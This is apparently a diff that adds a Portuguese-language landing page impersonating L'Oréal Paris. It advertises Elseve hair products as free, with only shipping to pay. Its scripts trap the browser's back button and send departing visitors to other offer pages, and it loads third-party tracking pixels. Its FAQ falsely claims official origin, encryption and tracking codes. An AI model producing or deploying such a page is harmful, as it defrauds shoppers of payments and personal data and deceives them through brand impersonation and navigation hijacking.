@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<link rel="preload" as="image" href="/img/Cxk58Kd9-shopping-1-removebg-preview.png" fetchpriority="high" />
+
+<script>
+        (function() {
+            const KEY = '__qs_entry__';
+            try {
+                if (!sessionStorage.getItem(KEY)) {
+                    sessionStorage.setItem(KEY, window.location.search || '');
+                }
+            } catch (e) {}
+            history.replaceState({ backtrap: 'root' }, '', location.pathname + (location.search || '') + location.hash);
+            history.pushState({ backtrap: 'guard' }, '');
+            window.addEventListener('popstate', function(ev) {
+                const st = ev.state || history.state;
+                if (!st || st.backtrap !== 'root') return;
+                let qs = '';
+                try {
+                    qs = location.search || sessionStorage.getItem(KEY) || '';
+                    if (qs && qs[0] !== '?') qs = '?' + qs;
+                } catch (e) {}
+                location.replace('/elseve/back/2' + (qs || ''));
+            });
+        })();
+    </script>
+    <meta charset="UTF-8">
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+ <script>
+  window.pixelId = "699052447f0cf151dff45c39";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = 'back/1';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>L'Oréal Paris | Resgate Exclusivo</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --white: #FFFFFF;
+            --light-grey: #F2F2F2;
+            --text-main: #1A1A1A;
+            --accent-purple: #8A2BE2;
+            --border: #E5E5E5;
+            --gold: #D4AF37;
+            --success: #00A650;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--white);
+            color: var(--text-main);
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Intro Cinematográfica - Fundo Branco */
+        .cinema-intro {
+            position: fixed; inset: 0; background: var(--white); z-index: 9999;
+            display: flex; align-items: center; justify-content: center;
+            animation: fadeOut 1s ease 1.5s forwards;
+        }
+        .cinema-intro .logo-anim { 
+            font-family: 'Cinzel'; letter-spacing: 15px; color: #000; 
+            animation: tracking-in 1.2s cubic-bezier(0.215, 0.610, 0.355, 1.000) both; 
+            font-size: 24px; text-align: center;
+        }
+        @keyframes fadeOut { to { opacity: 0; pointer-events: none; } }
+        @keyframes tracking-in { 0% { letter-spacing: -20px; opacity: 0; } 100% { letter-spacing: 15px; opacity: 1; } }
+
+        header {
+            padding: 15px 0; background: var(--white); border-bottom: 1px solid var(--border);
+            position: sticky; top: 0; z-index: 1000; text-align: center;
+        }
+        .brand { font-family: 'Cinzel', serif; font-size: 20px; letter-spacing: 8px; font-weight: 700; }
+
+        /* Barra de Escassez Local */
+        .geo-bar {
+            background: #E30613; color: white; padding: 10px; text-align: center;
+            font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px;
+        }
+
+        /* Banners Oficiais Sem Vazar */
+        .hero-banner { width: 100%; overflow: hidden; background: #fff; line-height: 0; }
+        .hero-banner img { width: 100%; height: auto; object-fit: contain; }
+
+        .container { max-width: 1200px; margin: 0 auto; padding: 30px 12px; }
+
+        .section-header { text-align: center; margin-bottom: 30px; }
+        .section-header h2 { font-family: 'Cinzel'; font-size: 18px; letter-spacing: 3px; border-bottom: 2px solid var(--accent-purple); display: inline-block; padding-bottom: 5px; }
+
+        /* GRID FIXO 2x2 */
+        .product-grid {
+            display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px;
+        }
+
+        .product-card {
+            background: var(--white); border: 1px solid var(--border); border-radius: 8px;
+            padding: 15px 10px; display: flex; flex-direction: column; position: relative;
+            transition: 0.3s;
+        }
+        .product-card:active { transform: scale(0.98); border-color: var(--accent-purple); }
+
+        .product-card img { width: 100%; height: 160px; object-fit: contain; margin-bottom: 12px; }
+        
+        .stars { color: var(--gold); font-size: 10px; margin-bottom: 6px; display: flex; align-items: center; gap: 2px; }
+        .reviews-text { font-size: 9px; color: #777; margin-left: 4px; font-family: 'Poppins'; }
+
+        .product-name { font-size: 12px; font-weight: 600; line-height: 1.2; height: 30px; margin-bottom: 6px; overflow: hidden; }
+        .description { font-size: 10px; color: #666; height: 28px; overflow: hidden; margin-bottom: 12px; line-height: 1.4; }
+
+        .price-box { margin-top: auto; padding-top: 10px; }
+        .old-price { font-size: 11px; text-decoration: line-through; color: #999; display: block; }
+        .new-price { font-size: 18px; font-weight: 700; color: var(--success); }
+
+        .btn-resgate {
+            background: #000; color: #fff; border: none; padding: 12px 0; margin-top: 15px;
+            border-radius: 4px; font-weight: 700; text-transform: uppercase; font-size: 10px;
+            width: 100%; cursor: pointer; letter-spacing: 1px;
+        }
+
+        /* FAQ SECTON */
+        .faq-section { margin-top: 50px; padding: 20px; background: var(--light-grey); border-radius: 12px; }
+        .faq-title { font-family: 'Cinzel'; font-size: 20px; text-align: center; margin-bottom: 25px; }
+        .faq-item { border-bottom: 1px solid #ddd; padding: 15px 0; }
+        .faq-question { font-size: 13px; font-weight: 600; display: flex; justify-content: space-between; align-items: center; }
+        .faq-answer { font-size: 12px; color: #555; margin-top: 10px; display: none; line-height: 1.6; }
+        .faq-item.active .faq-answer { display: block; }
+
+        /* FOOTER */
+        footer { padding: 60px 20px; border-top: 1px solid var(--border); text-align: center; background: #fff; }
+        .footer-logo { font-family: 'Cinzel'; font-size: 22px; margin-bottom: 15px; letter-spacing: 5px; }
+        .footer-links { font-size: 10px; color: #888; display: flex; justify-content: center; gap: 20px; margin-bottom: 20px; }
+        .secure-badge { margin-top: 20px; opacity: 0.6; width: 120px; }
+
+        @media (max-width: 360px) {
+            .product-name { font-size: 11px; }
+            .new-price { font-size: 16px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="cinema-intro">
+        <div class="logo-anim">L’ORÉAL<br><span style="font-size: 10px; letter-spacing: 5px;">PARIS</span></div>
+    </div>
+
+
+    <header><div class="brand">L’ORÉAL</div></header>
+
+    <div class="hero-banner">
+        <img src="https://www.loreal-paris.com.br/-/media/project/loreal/brand-sites/oap/americas/br/landings/2025/promo-elseve-colageno/v2/banner-promo-elseve-colageno-desktop-v2.png">
+    </div>
+
+    <div class="container">
+        <div class="section-header"><h2>Coleção Collagen Lifter</h2></div>
+        
+        <div class="product-grid">
+            <div class="product-card">
+                <img src="https://www.loreal-paris.com.br/-/media/project/loreal/brand-sites/oap/americas/br/products/hair/hair-care/elseve/2025/collagen-lifter/packs/collagen-lifter-shampoo-200ml-v2.png">
+                <div class="stars">★★★★★ <span class="reviews-text">(1.420)</span></div>
+                <h3 class="product-name">Shampoo Reestruturador 200ml</h3>
+                <p class="description">Limpeza profunda com preenchimento.</p>
+                <div class="price-box"><span class="old-price">R$ 34,90</span><span class="new-price">R$ 0,00</span></div>
+                <button class="btn-resgate" onclick="location.href='/elseve/produtos/produto1'">Resgatar Agora</button>
+            </div>
+            <div class="product-card">
+                <img src="https://www.loreal-paris.com.br/-/media/project/loreal/brand-sites/oap/americas/br/products/hair/hair-care/elseve/2025/collagen-lifter/packs/collagen-lifter-tratamento-300g-v2.png">
+                <div class="stars">★★★★★ <span class="reviews-text">(2.105)</span></div>
+                <h3 class="product-name">Máscara Plástica Capilar 300g</h3>
+                <p class="description">Tratamento intensivo molecular.</p>
+                <div class="price-box"><span class="old-price">R$ 52,90</span><span class="new-price">R$ 0,00</span></div>
+                <button class="btn-resgate" onclick="location.href='/elseve/produtos/produto2'">Resgatar Agora</button>
+            </div>
+            <div class="product-card">
+                <img src="https://http2.mlstatic.com/D_Q_NP_668012-MLB103937527202_012026-F.webp">
+                <div class="stars">★★★★★ <span class="reviews-text">(4.890)</span></div>
+                <h3 class="product-name">Kit Premium Collagen Full</h3>
+                <p class="description">Kit completo de resgate capilar.</p>
+                <div class="price-box"><span class="old-price">R$ 138,00</span><span class="new-price">R$ 0,00</span></div>
+                <button class="btn-resgate" onclick="location.href='/elseve/produtos/produto4'">Resgatar Agora</button>
+            </div>
+            <div class="product-card">
+                <img src="/img/Cxk58Kd9-shopping-1-removebg-preview.png" fetchpriority="high" decoding="async" loading="eager">
+                <div class="stars">★★★★★ <span class="reviews-text">(954)</span></div>
+                <h3 class="product-name">Duo Molecular Advanced</h3>
+                <p class="description">Reparação para danos químicos.</p>
+                <div class="price-box"><span class="old-price">R$ 96,00</span><span class="new-price">R$ 0,00</span></div>
+                <button class="btn-resgate" onclick="location.href='/elseve/produtos/produto3'">Resgatar Agora</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="hero-banner">
+        <img src="https://www.loreal-paris.com.br/-/media/project/loreal/brand-sites/oap/americas/br/landings/2025/elseve/liso-dos-sonhos/banner/liso-dos-sonhos-2.jpeg">
+    </div>
+
+    <div class="container">
+        <div class="section-header"><h2>Liso dos Sonhos</h2></div>
+        
+        <div class="product-grid">
+            <div class="product-card">
+                <img src="https://www.loreal-paris.com.br/-/media/project/loreal/brand-sites/oap/americas/br/products/hair/hair-care/elseve/2025/liso-dos-sonhos/shampoo/200ml/imagem-liso-dos-sonhos-200ml-packsho.png">
+                <div class="stars">★★★★★ <span class="reviews-text">(2.980)</span></div>
+                <h3 class="product-name">Shampoo Liso Prolongado</h3>
+                <p class="description">Alinhamento total sem frizz.</p>
+                <div class="price-box"><span class="old-price">R$ 32,90</span><span class="new-price">R$ 0,00</span></div>
+                <button class="btn-resgate" onclick="location.href='/elseve/produtos/produto5'">Resgatar Agora</button>
+            </div>
+            <div class="product-card">
+                <img src="https://www.drogasil.com.br/_next/image?url=https%3A%2F%2Fproduct-data.raiadrogasil.io%2Fimages%2F14976906.webp&w=640&q=75">
+                <div class="stars">★★★★★ <span class="reviews-text">(5.340)</span></div>
+                <h3 class="product-name">Kit Liso dos Sonhos Expert</h3>
+                <p class="description">Liso perfeito por até 7 dias.</p>
+                <div class="price-box"><span class="old-price">R$ 144,00</span><span class="new-price">R$ 0,00</span></div>
+                <button class="btn-resgate" onclick="location.href='/elseve/produtos/produto6'">Resgatar Agora</button>
+            </div>
+            <div class="product-card">
+                <img src="https://www.loreal-paris.com.br/-/media/project/loreal/brand-sites/oap/americas/br/products/hair/hair-care/elseve/2025/liso-dos-sonhos/serum/serum-liso-por-1-semana.png">
+                <div class="stars">★★★★★ <span class="reviews-text">(1.120)</span></div>
+                <h3 class="product-name">Serum Anti-Frizz Gloss</h3>
+                <p class="description">Brilho espelhado e proteção.</p>
+                <div class="price-box"><span class="old-price">R$ 64,00</span><span class="new-price">R$ 0,00</span></div>
+                <button class="btn-resgate" onclick="location.href='/elseve/produtos/produto7'">Resgatar Agora</button>
+            </div>
+            <div class="product-card">
+                <img src="/img/0QT2rRPJ-creme-para-pentear-elseve-liso-dos-sonhos-250ml-97671-1-12a35ca16ba0e77b6820a21273691568-removebg-pr.png" fetchpriority="high" decoding="async" loading="eager">
+                <div class="stars">★★★★★ <span class="reviews-text">(840)</span></div>
+                <h3 class="product-name">Creme Alinhamento Térmico</h3>
+                <p class="description">Proteção contra fontes de calor.</p>
+                <div class="price-box"><span class="old-price">R$ 42,90</span><span class="new-price">R$ 0,00</span></div>
+                <button class="btn-resgate" onclick="location.href='/elseve/produtos/produto8'">Resgatar Agora</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="faq-section">
+            <h3 class="faq-title">Dúvidas Frequentes</h3>
+            <div class="faq-item" onclick="this.classList.toggle('active')">
+                <div class="faq-question">É realmente grátis? <span>▼</span></div>
+                <div class="faq-answer">Sim! Esta é uma ação promocional de 2026 para queima de estoque e divulgação da nova linha molecular. Você paga apenas o frete de envio.</div>
+            </div>
+            <div class="faq-item" onclick="this.classList.toggle('active')">
+                <div class="faq-question">Como sei que é seguro? <span>▼</span></div>
+                <div class="faq-answer">Nossa página utiliza criptografia de ponta a ponta. Após o resgate, você recebe o código de rastreio oficial no seu e-mail em até 24h.</div>
+            </div>
+            <div class="faq-item" onclick="this.classList.toggle('active')">
+                <div class="faq-question">O produto é original? <span>▼</span></div>
+                <div class="faq-answer">Com certeza. Todos os produtos saem diretamente do centro de distribuição oficial da L'Oréal para a sua casa.</div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-logo">L’ORÉAL PARIS</div>
+        <div class="footer-links">
+            <span>Privacidade</span> | <span>Termos</span> | <span>Ajuda</span>
+        </div>
+        <div style="font-size: 9px; opacity: 0.5;">© 2026 L'Oréal Paris. Todos os direitos reservados.</div>
+    </header>
+
+
+</body>
+</html>
